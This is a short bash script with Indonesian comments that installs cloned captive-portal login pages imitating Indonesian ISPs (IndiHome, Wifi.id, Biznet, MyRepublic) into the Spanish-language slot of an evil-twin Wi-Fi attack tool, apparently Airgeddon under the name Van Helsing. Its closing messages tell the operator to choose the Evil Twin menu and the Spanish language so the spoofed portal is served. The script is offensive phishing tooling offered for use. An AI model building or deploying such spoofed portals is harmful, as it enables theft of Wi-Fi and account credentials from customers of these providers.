#!/bin/bash

# Van Helsing Portal Selector
# Fungsi: Memilih tampilan portal (IndiHome/Biznet/dll) dengan mudah.
# Cara kerja: "Membajak" slot bahasa SPANYOL (Spanish).

# Warna & UI
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

clear
echo -e "${RED}==============================================${NC}"
echo -e "${RED}    VAN HELSING PORTAL SELECTOR (v1.0)        ${NC}"
echo -e "${RED}==============================================${NC}"
echo -e "${YELLOW}Pilih tampilan portal yang ingin digunakan:${NC}"
echo ""
echo "1. IndiHome (Psychological Warfare Mode)"
echo "2. Wifi.id (Standard Login)"
echo "3. Biznet (Standard Login)"
echo "4. MyRepublic (Standard Login)"
echo "5. Restore Original (Kembali ke bawaan)"
echo ""
read -p "Pilihan Anda [1-5]: " CHOICE

# Tentukan Source Folder
case $CHOICE in
    1) PORTAL_DIR="indihome_portal"; NAME="IndiHome";;
    2) PORTAL_DIR="wifi_id_portal"; NAME="Wifi.id";;
    3) PORTAL_DIR="biznet_portal"; NAME="Biznet";;
    4) PORTAL_DIR="myrepublic_portal"; NAME="MyRepublic";;
    5) 
        echo -e "\n[*] Menghapus portal custom..."
        rm -rf www/captiveportals/es
        echo -e "${GREEN}[DONE] Portal kembali ke original/download.${NC}"
        exit 0
        ;;
    *) echo -e "${RED}Pilihan salah!${NC}"; exit 1;;
esac

# Cek apakah folder portalnya ada
if [ ! -d "$PORTAL_DIR" ]; then
    echo -e "${RED}[ERROR] Folder $PORTAL_DIR tidak ditemukan!${NC}"
    exit 1
fi

echo -e "\n[*] Memasang portal $NAME..."

# Buat struktur folder tujuan (Slot Bahasa Spanyol / 'es')
# Van Helsing / Airgeddon mencari di folder ini
TARGET_DIR="www/captiveportals/es"
mkdir -p "$TARGET_DIR"

# Bersihkan slot lama dan copy yang baru
rm -rf "$TARGET_DIR"/*
cp -r "$PORTAL_DIR"/* "$TARGET_DIR"/

echo -e "${GREEN}[SUCCESS] Portal $NAME berhasil dipasang!${NC}"
echo -e "--------------------------------------------------------"
echo -e "PENTING: Saat menjalankan Van Helsing nanti:"
echo -e "1. Pilih Menu Evil Twin."
echo -e "2. Saat ditanya Bahasa (Language), pilih ${YELLOW}SPANISH / ES${NC}."
echo -e "   (Karena kita baru saja menaruh file ini di slot Spanyol)"
echo -e "--------------------------------------------------------"
